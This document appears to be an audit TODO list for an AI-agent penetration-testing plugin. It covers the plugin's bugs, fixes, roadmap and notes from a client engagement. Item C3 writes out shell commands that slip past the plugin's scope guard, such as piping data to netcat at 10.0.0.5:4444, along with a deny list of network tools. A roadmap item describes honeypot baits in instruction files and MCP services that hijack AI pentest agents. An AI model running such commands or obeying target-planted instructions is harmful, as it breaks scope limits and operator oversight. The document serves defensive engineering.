# Quarry — Audit TODO

Consolidated from two independent reviews (Nov 2026).
Each item has a status: `[ ]` pending, `[x]` done, `[-]` won't fix (with reason).

---

## Critical — fix before anything else

### C1. YAML wildcard crashes full-pentest.yaml
- **File:** `workflows/full-pentest.yaml:64`
- **Bug:** `- *` is an invalid YAML alias; the loader crashes at runtime.
- **Mask:** `tests/validate_plugin.py:40-41,242,253` silently patches it with regex before parsing.
- **Fix:** Quote it as `- "*"`. Remove the regex workarounds from the validator. Promote YAML parse errors to hard failures.
- [x] Fix workflow YAML
- [x] Remove validator workarounds
- [x] Add regression test: load all workflows with stdlib yaml.safe_load (`tests/test_yaml_load.py`, 14 parametrized tests)

### C2. Real client data in public repo
- **Files:** `commands/engage.md:15-16,36-42`, `commands/chain.md:36-37`
- **Data:** `amplifica.io`, `fazt.cl`, `portalnet_audit`, `amplifica_audit`, `fazt_audit`, Syncfonía F2+F7, Amplifica token-leak→ATO, Las Margaritas CVE-2024-28000+NF-nonce, `~/Dev/personal/<slug>_audit/` convention.
- **Risk:** Leaks client names and engagement patterns in an MIT repo headed for marketplace.
- **Fix:** Replace with `target.example.com`, `acme-corp_audit`, generic chain examples. Use `$QUARRY_AUDIT_DIR` or `~/.quarry/engagements/<slug>/` as convention.
- **Note:** Data already in git history — consider history rewrite or repo recreation before marketplace publish.
- [x] Sanitize engage.md
- [x] Sanitize chain.md
- [x] Rename Bountyforge in map.md (`commands/map.md:3`)
- [x] Sanitize chain-matrix.md, scope.md, chain_engine.py, design doc

### C3. Bash scope bypass in policy.py
- **File:** `engine/policy.py:113-125`
- **Bug:** `command_policy()` only inspects `argv[0]`. Wrappers bypass it:
  - `bash -c "nmap -sV target"` → allowed
  - `cat x | nc 10.0.0.5 4444` → allowed (pipeline)
  - `python3 -c "import socket..."` → allowed
  - `env curl https://outside.test` → allowed
  - `sudo curl https://outside.test` → allowed
- **Missing tools:** `ssh`, `openssl`, `socat`, `telnet`, `netcat`, `python3`, `python`, `node`, `ruby`, `perl`
- **Fix:**
  1. Tokenize the entire command and flag ANY token that is a network tool
  2. Unwrap `bash -c`, `sh -c`, `env`, `sudo`, `xargs` recursively
  3. Add `ssh`, `openssl`, `socat`, `telnet` to NETWORK_TOOLS
  4. Add `python3`, `python`, `node`, `ruby`, `perl`, `bash`, `sh` to a SHELL_WRAPPERS set that triggers deeper inspection
  5. Document in README that the guard is a tripwire, not a sandbox
  6. Add regression tests for all bypass patterns
- [x] Harden command_policy()
- [x] Add SHELL_WRAPPERS detection
- [x] Add missing tools to NETWORK_TOOLS
- [x] Add regression tests (`tests/test_policy_bypass.py`, 22 tests covering all bypass patterns)

### C4. Artifacts are not actually immutable
- **File:** `engine/artifacts.py:51-67`
- **Bug:** `artifact_id` = `sha256(run_id:task_id:kind)[:20]`. Same combination → same ID → overwrite. The index filters out the old entry (line 66) and replaces it.
- **Repro:** Two captures with defaults `run_id="manual"`, `task_id="http"` → second overwrites first.
- **Fix:**
  1. Use UUID or ULID per capture (not content-derived)
  2. Include timestamp or counter in the path
  3. Never replace an existing artifact file
  4. Keep the content hash for integrity verification, not as identity
- [x] Fix artifact_id generation (UUID)
- [x] Make path unique per capture (timestamp + id suffix)
- [x] Refuse to overwrite existing artifacts
- [x] Add regression test: two captures with same run/task/kind (`tests/test_artifact_immutability.py`, 6 tests)

### C5. Finding without evidence can be exported as validated
- **File:** `engine/findings.py:137-145,150-168`
- **Bug:** `FindingsStore.add()` accepts a Finding with `status="validated"` directly. `update_status()` allows transition to VALIDATED without checking for evidence, steps_to_reproduce, or evidence_tag.
- **Exporters** (`engine/exporters.py:29-36`) only check status, not evidence presence.
- **Fix:**
  1. New findings must start as `detected` (reject other statuses in `add()`)
  2. Transition to `validated` requires: `len(evidence) > 0`, `evidence_tag != "unproven"`, `len(steps_to_reproduce) >= 1`
  3. Exporters double-check evidence presence before including validated findings
- [x] Enforce initial status = detected in add()
- [x] Add evidence gate in update_status() for VALIDATED transition
- [x] Add exporter pre-check (filter findings without evidence)

### C6. GitHub Action can give green on failures
- **File:** `action.yml:45,57`
- **Bugs:**
  1. `|| true` on validator (line 45) and tests (line 57) — failures are swallowed
  2. `executionSuccessful: True` hardcoded (line 92)
  3. `continue-on-error: true` on SARIF upload (line 151)
  4. Validator emits `  ERROR:` (indented) but parser looks for `^ERROR:` — misses everything
  5. Tests emit `RESULTS: 0 failures` but parser looks for `N passed` — may always read 0
  6. SARIF generation wraps everything in bare except (lines 107-109)
- **Also:** Action runs self-check, not a scan of the target repo. README should say so.
- [x] Remove `|| true` from validator and test steps
- [x] Fix output parsers to match actual output format (`  ERROR:`, `  WARN:`)
- [x] Remove bare except in SARIF generation
- [x] Set executionSuccessful based on actual result
- [x] Rename/document as "Quarry self-check" (`action.yml` renamed + description clarified)

### C7. README install command doesn't exist + doctor doesn't check binaries
- **File:** `README.md:63,80-84`
- **Bugs:**
  1. `claude plugin add /path/to/quarry` is not a real Claude Code command
  2. README says doctor checks nmap/nuclei/ffuf/httpx but it only checks engagement integrity
- **Fix:**
  1. Correct install instructions
  2. Make doctor actually check binaries (tool_registry.py already has the data)
- [x] Fix README install instructions
- [x] Implement binary checks in doctor command (via ToolRegistry.probe)

---

## Important — fix next

### I1. Network paths outside common policy
- **Files:** `engine/browser_loop.py:93-101`, `engine/browser_verify.py:127-151`, `engine/mcp_client.py:116-137`
- **Bug:** Browser navigation and MCP calls bypass PolicyEngine scope checks. URL redirects and secondary requests are not validated.
- [x] Route browser URLs through scope validation (`browser_loop.navigate()`, `browser_verify` all probes)
- [x] Add redirect interception (`browser_loop.navigate()` now validates final URL after redirects, logs `browser_redirect_blocked` to custody)
- [x] Validate MCP tool targets against scope (`mcp_client.call_tool()` extracts URLs from params, `_connect_http()` validates server URL)

### I2. Broken skill/workflow references (22+ warnings, 64+ hidden)
- **Missing skills referenced:** `gotchas`, `deliver`, `artifact-cleanup`, `credential-hygiene`, `evidence-seal`, `data-retention`, `target-diff` (is engine module, not skill), `param-discovery` (9 skills depend on it)
- **Stale references:** `auth-mapping` (should be `identity-map`?), `tech-fingerprint`/`subdomain-enum` (deleted)
- **Validator gap:** only checks workflows→skills, not skills→skills
- [x] Create or redirect missing skills (4 closeout skills created; `gotchas` removed from workflow refs; `deliver` changed to command ref; `target-diff` replaced with `active-recon` in retest.yaml)
- [x] Fix stale references (`auth-mapping`→`identity-map` 5 files, `tech-fingerprint`→`tech-stack-fingerprint` 3 files, `subdomain-enum`→`subdomain-discovery` 5 files, `cloud-asset-discovery`→`cloud-recon` 3 files, `param-discovery`→`fuzzing` 8 files, `app-profile`→`api-discovery` 2 files, `recon-asset-discovery`→`active-recon` 2 files, path-prefixed refs fixed)
- [x] Add skills→skills validation to validator (`check_skill_deps()` in `validate_plugin.py`)

### I3. Mixed language ES/EN
- **Status:** README/agents/skills in English; CLAUDE.md, 13/18 commands, all 14 workflows and templates in Spanish.
- **TODO-REVIEW says:** "All text in English (repo is public)"
- [x] Unify command descriptions (10 commands ES → EN)
- [x] Unify workflow descriptions (10 workflows + full-pentest phase descriptions)
- [x] Translate command body text (18 commands ES → EN)
- [x] Translate workflow notes/comments (8 workflows: closeout, cve-response, pr-scan, purple-team, retest, surface-watch translated; full-pentest + recon-only already clean)

### I4. 10/18 agents not wired to any workflow
- **Unwired:** `engagement-planner`, `browser-verifier`, `ai-agent-exploit`, `network-analyst` (declares inputs nothing produces), 6 SAST agents
- **Bug:** `retest.yaml` assigns baseline phase to `monitor-agent` (read-only, tools: [Read])
- [x] Wire agents to workflows: `engagement-planner`→full-pentest scope, `network-analyst`→full-pentest recon, `browser-verifier`→full-pentest validation, `ai-agent-exploit`→ai-agent-pentest hunting, 6 SAST agents→pr-scan static-checks
- [x] Fix retest.yaml agent assignment (monitor-agent→recon-agent, done in I2)
- [-] Remove or mark experimental agents — `monitor-agent` is auxiliary (periodic/on-demand), correctly documented as such

### I5. Finding-checker blindness may be fictional
- `omitClaudeMd: true` / `isolation: blind` are not standard frontmatter keys
- If runtime ignores them, rebuttal "blind" review is prompt-only
- [x] Document as prompt-level directives (no runtime enforcement yet)
- [ ] Future: enforce at engine level when spawning agent sessions

### I6. Drift in vuln class counts
- hunt.md says 40, findings.md says 38, coverage.py defines 42, skills/hunt/ has 46
- [x] Remove hardcoded counts from commands (hunt.md, findings.md)

### I7. finding-validator.md uses CVSS 3.1 (plugin standard is 4.0)
- [x] Update to CVSS 4.0 as primary (finding-validator.md, seven-question-gate.md, finding-discipline SKILL.md, finding-template.md)

### I8. plugin.json missing mcpServers
- browser-verifier depends on 7 `mcp__Claude_Browser__*` tools
- [x] Add mcpServers.browser-verifier with 7 Claude Browser tools (marked optional)

### I9. Custody chain is locally tamper-evident, not attestable
- Anyone with write access can rewrite log and recalculate hashes
- [x] Update description to "locally tamper-evident" (README.md, CLAUDE.md, custody.py)
- [ ] Future: operator signature, external timestamping

### I10. Benchmark doesn't execute targets
- `.github/workflows/validate.yml:71-90` only runs synthetic scorer test and uploads existing results
- [x] Update README to clarify benchmarks are from manual runs, not automated CI
- [ ] Future: implement real benchmark execution against Docker targets in CI

---

## Additions needed

- [x] `argument-hint` in frontmatter of all 19 commands (19/19 done)
- [x] `SECURITY.md` (responsible disclosure via GitHub Security Advisories)
- [x] `CHANGELOG.md`, `CONTRIBUTING.md`
- [ ] Example session in README (DVWA transcript snippet)
- [x] Skill `param-discovery` redirected to `fuzzing` (8 files updated)
- [x] Wire SAST pipeline to `pr-scan.yaml` (6 agents added to static-checks phase)
- [x] Canonical verdict→FindingStatus mapping table (`references/verdict-status-mapping.md`)
- [ ] Git tags + releases (currently 0.1.0 with no tags)
- [x] `pyproject.toml` with dev deps, pytest config, ruff, type checking
- [ ] Smoke test: real Claude Code session (install, doctor, delegate, hooks)

---

## Removals / cleanup

- [x] Archive `TODO-REVIEW.md` → `docs/archived-TODO-REVIEW.md`
- [x] Remove absolute claims from README intro ("no other plugin", "No hallucinated vulns")
- [x] Remove personal paths from engage.md examples (see C2)
- [x] Remove Bountyforge from map.md (see C2)
- [x] Mark experimental backends (Kali remote, anonlab) in `references/tool-backends.md` with maturity table — they share policy engine but lack tests
- [x] Cross-reference rebuttal questions: 7-question gate (pre-submit self-check) and finding-checker (adversarial review) are complementary, not duplicates; `engine/rebuttal.py` is the simplified prompt version. All three now cross-reference each other and `references/verdict-status-mapping.md`
- [x] Consolidate report definition: `agents/report-writer.md` now references `templates/engagement-report.md` as single source of truth
- [x] Fix `cve-response.yaml` phases with only `notes:` — added skills to all 4 phases

---

## Deferred (not actionable without external resources)

- [ ] I5 future: runtime enforcement of `isolation: blind` when spawning agent sessions
- [ ] I9 future: operator signature + external timestamping for custody chain
- [ ] I10 future: automated benchmark execution against Docker targets in CI
- [ ] Example session in README (needs a real DVWA session to capture)
- [ ] Smoke test (needs real Claude Code runtime to test install/doctor/delegate/hooks)
- [ ] Git tags + releases (operator decision on versioning scheme)

## Roadmap — architecture ideas from external research

Source: IronCurtain (Provos), zsec Harnessing Harnesses / Bullying LLMs (Andy Gill),
bug bounty community tips. Items are design-level changes, not quick fixes.

- [ ] **Hallucination Bin** — all findings start as "hallucination", promoted through
      explicit gates (PoC compiles, reproduces on clean snapshot, exploitable as
      standard user). Inverts current logic where findings start at DETECTED.
      Ref: zsec "Bullying LLMs" — promote/demote tools, 4-gate pipeline.
- [ ] **Hypothesis journal** — append-only journal (separate from custody log) tracking
      hypotheses, tests attempted, and reasoning per engagement. Enables context
      rehydration per agent and cross-session reasoning.
      Ref: IronCurtain (Provos) — FSM + orchestrator agent + journal.
- [ ] **Re-hunting prompt** — after first-pass hunting, explicitly prompt the agent to
      re-examine areas with "assume you missed something, look deeper at X" framing.
      Currently rebuttal only challenges existing findings, not hunting gaps.
      Ref: zack0x01 tip, zsec campaign iteration.
- [ ] **RAG cross-campaign** — FAISS + sentence-transformer embeddings indexing
      techniques that worked, defenses encountered, and dead ends across engagements.
      Enables "what worked against similar targets?" before starting a new campaign.
      Ref: zsec both articles — 561K+ chunks, Sigma rules, tool docs.
- [ ] **Defense registry** — JSON in `.pentest-state/` tracking known defenses per
      target (WAF rules, hardened configs, AM-PPL, CSP). Penalizes priority for
      repeat campaigns against hardened surfaces. Low complexity, high ROI.
      Ref: zsec both articles — multiplicative priority penalty.
- [ ] **Tiered validation harnesses** — escalate validation cost progressively:
      single-function isolation harness → multi-component harness → full VM/container.
      Currently all validation is at the same level.
      Ref: IronCurtain (Provos) — 3-tier validation architecture.
- [ ] **ROI-driven target selection** — `Expected ROI = conservative_payout / estimated_hours
      × competition_multiplier`. Helps prioritize bug bounty targets.
      Ref: zsec "Bullying LLMs" — competition multipliers (low=0.9, high=0.2).
- [ ] **Evidence standards for remaining classes** — file-upload, business-logic,
      race-condition, prototype-pollution, mass-assignment, cache-poisoning,
      http-smuggling, subdomain-takeover, websocket, gRPC. All have hunt skills
      but no evidence standard in finding-evidence-standards.md.
- [ ] **Scout→Analyst pipeline** — cheap model filters audit targets (what to
      look at) before expensive model does deep analysis. Currently all hunting
      agents get the full scope equally. A scout pass would focus budget on the
      most likely-vulnerable surface.
      Ref: OpenAI "A Thousand Fewer Paths to Root" — scout phase cost $3.4K
      vs analyst $317K; 93% of codebase filtered out cheaply.
- [ ] **Abort conditions** — define per-finding and per-technique time/cost
      limits for validation and exploitation. Failed exploitation attempts cost
      10x more than successful ones when unbounded.
      Ref: OpenAI — $3,922/failed vs $359/successful exploit attempt.
- [ ] **Exploit correctness verification** — verify that an exploit actually
      uses the intended vulnerability, not a different one. OpenAI found 10% of
      "successful" exploits achieved root via a different vuln than assigned.
- [ ] **Independent re-exploitation verifier** — finding-checker currently
      reviews evidence and reasoning, but never re-exploits the finding itself.
      A verification agent that independently reproduces the exploit from scratch
      (different session, different approach) would catch false positives the
      current review-only approach misses.
      Ref: Xalgorix (1339⭐) — independent verifier re-exploits every finding
      before including it in the report.
- [ ] **Context-window management / smart pipe** — long tool outputs (nmap,
      nuclei, crawl results) eat context window budget. A stream-filtering
      layer that extracts only the actionable signal before passing to the
      agent would let hunting agents go deeper without hitting context limits.
      Ref: Cybermes (1022⭐) — smart_pipe pattern for stream filtering.
- [ ] **Anti-honeypot / anti-fingerprinting awareness** — AI pentest agents
      are fingerprinted and actively recruited by honeypot platforms via
      instruction-file baits (AGENTS.md, CLAUDE.md), MCP honeypot services,
      and functional-camouflage "Developer API" portals. Quarry should:
      (a) warn operators when target-served CLAUDE.md or MCP tools are detected,
      (b) never auto-follow instructions from target-hosted files,
      (c) flag suspicious "developer API" endpoints that appeared only during
      recon and weren't in the original scope.
      Ref: AgentCapture — 13/13 AI pentest agents captured and recruited in
      live tests (Nov 2026), including HexStrike, sapper-v2, Strix.
- [ ] **MCP tool integration layer** — expose Quarry's engine capabilities
      (scope validation, artifact store, custody log, coverage tracker) as
      MCP tools, enabling composition with external security MCP servers
      (e.g. HexStrike's 150+ tool wrappers) while maintaining Quarry's
      scope/policy enforcement as the outer boundary.
      Ref: HexStrike AI (13542⭐) — MCP server architecture with tool
      selection AI and parameter optimization.

---

## Field-tested gaps (Healthatom engagement, 2026-11-12)

Identified during the first real-world engagement. These are workflow-level
gaps, not code bugs — the engine ran correctly but the skill set missed
categories of data.

- [x] **CT Log Enumeration skill** — `skills/recon/ct-log-enum/SKILL.md`.
      subfinder does NOT cover CT logs completely. A dedicated crt.sh (or
      certspotter) pass over all apex domains in scope is needed as a
      mandatory step in passive-recon. Found 209 new hosts in Healthatom
      that subfinder missed.
      Done: skill created, wired to recon-only.yaml and full-pentest.yaml.
- [x] **Email Security DNS skill** — `skills/core/email-security/SKILL.md`
      (already existed). DMARC/SPF/DKIM audit per in-scope domain. Wired
      to recon-only.yaml and full-pentest.yaml recon phases.
- [x] **RFC1918 leak post-processing** — added to `skills/recon/passive-recon`
      step 8: after DNS resolution, filter A records for RFC1918/loopback IPs.
      Also documented in ct-log-enum step 4.
- [x] **Security policy parser** — `skills/engage/security-policy-parser/SKILL.md`.
      Parses bug bounty policy for test account availability, exclusions, safe
      harbor, SLA. Wired to scope phase of recon-only.yaml and full-pentest.yaml.

## Severity calibration notes (Healthatom review, 2026-11-12)

External review flagged adjustments needed before reporting:

- **H-01/H-02 (CSRF):** Absence of CSRF token ≠ confirmed CSRF. Must verify
  that the server does NOT validate Origin/Referer headers as a secondary
  defense. Downgrade to "candidate/unverified" until form-POST PoC with
  cross-origin Origin header succeeds.
- **H-18 (jQuery XSS):** PoC runs locally loading jQuery from target CDN,
  but XSS not demonstrated IN the target application. Correct label: "PoC
  local; sink in target pending authentication to validate."
- **H-17 (Host header injection):** Host reflection in script src is
  DEMONSTRATED on prod. But the full ATO chain (cache poisoning, password
  reset poisoning) remains INFERRED — no cache layer found, and reset
  poisoning requires authenticated testing.
- **H-19 (No WAF):** HTTP 200 with payload strings in URL params doesn't
  prove WAF absence — the app may accept but not process them. Downgrade
  to defense-in-depth observation, not a standalone medium finding.

---

## Recommended order

All critical (C1-C7) and important (I1-I10) items are now complete.
Remaining items are in the "Deferred" and "Field-tested gaps" sections above.
